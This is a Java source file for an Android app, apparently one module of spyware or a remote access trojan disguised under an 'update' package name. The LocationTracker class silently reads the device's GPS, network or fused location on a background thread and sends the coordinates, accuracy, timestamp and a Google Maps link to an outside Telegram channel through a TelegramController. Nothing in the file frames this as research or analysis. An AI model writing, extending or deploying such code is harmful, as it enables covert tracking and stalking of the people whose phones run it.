package com.kasari.update;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationTracker {

    public static void sendLocation(Context context) {
        new Thread(() -> {
            try {
                LocationManager locationManager = 
                    (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                
                Location location = null;
                
                if (locationManager != null) {
                    try {
                        location = locationManager.getLastKnownLocation(
                            LocationManager.GPS_PROVIDER);
                    } catch (Exception ignored) {}
                    
                    if (location == null) {
                        try {
                            location = locationManager.getLastKnownLocation(
                                LocationManager.NETWORK_PROVIDER);
                        } catch (Exception ignored) {}
                    }
                    
                    if (location == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        try {
                            location = locationManager.getLastKnownLocation(
                                LocationManager.FUSED_PROVIDER);
                        } catch (Exception ignored) {}
                    }
                }
                
                if (location != null) {
                    double lat = location.getLatitude();
                    double lon = location.getLongitude();
                    
                    String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                        Locale.getDefault()).format(new Date());
                    
                    TelegramController.sendMessage(context, 
                        "📍 **Location Updated**\nLat: " + lat + 
                        "\nLon: " + lon + 
                        "\nAccuracy: " + location.getAccuracy() + "m" +
                        "\nProvider: " + location.getProvider() +
                        "\nTime: " + timestamp +
                        "\n\nMap: https://maps.google.com/?q=" + lat + "," + lon);
                } else {
                    TelegramController.sendMessage(context, 
                        "📍 Location not available. Make sure GPS is ON.");
                }
                
            } catch (Exception e) {
                e.printStackTrace();
                TelegramController.sendMessage(context, 
                    "📍 Location error: " + e.getMessage());
            }
        }).start();
    }
}